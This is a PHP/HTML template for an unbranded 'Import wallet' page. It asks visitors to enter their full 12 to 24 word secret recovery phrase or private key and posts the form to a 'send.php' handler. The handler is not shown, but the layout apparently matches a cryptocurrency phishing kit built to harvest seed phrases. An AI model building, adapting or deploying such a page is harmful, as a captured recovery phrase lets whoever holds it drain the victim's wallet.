<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Import';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center mt40">
                <div class="col-sm-6 rounded-4 p25 mb50" style="border: solid #383838 1px;">
                    <h4 class="text-center fw-bold mt15">Import wallet</h4>
                    <div class="my15 fs18 lh28">Enter your wallet’s 12 – 24 word recovery phrase or private key. You can import any Ethereum, Solana, or Bitcoin recovery phrase. Only Ethereum private keys are supported.</div>
                    <div class="row mt30 py20 ">
                        <div class="col-sm-6 fw-bold fs18">Type your Secret Recovery Phrase</div>
                        <div class="col-sm-6">
                            <select class="form-select" id="recovery_phrase_select" aria-label="Default Recovery Phrase">
                                <option value="12">I have a 12-word phrase</option>
                                <option value="15">I have a 15-word phrase</option>
                                <option value="18">I have a 18-word phrase</option>
                                <option value="21">I have a 21-word phrase</option>
                                <option value="24">I have a 24-word phrase</option>
                            </select>
                        </div>
                    </div>
                    <div class="alert alert-primary border-0 border-start border-5 border-primary" role="alert">
                        <i class="fa-solid fa-circle-exclamation text-primary fs18 pe10" aria-hidden="true"></i>
                        You can paste your entire secret recovery phrase into any field
                    </div>
                    <form method="post" action="<?= base_url('send.php') ?>" class="py10">
                        <div class="row form_keys"></div>
                        <div class="row">
                            <div class="col-sm-12 my30 mb50 text-center">
                                <button type="submit" class="btn btn-outline-primary text-white border-white px60 rounded-pill py15 fs18">Continue</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <?php include_once './includes/footer.php'; ?>
</body>
</html>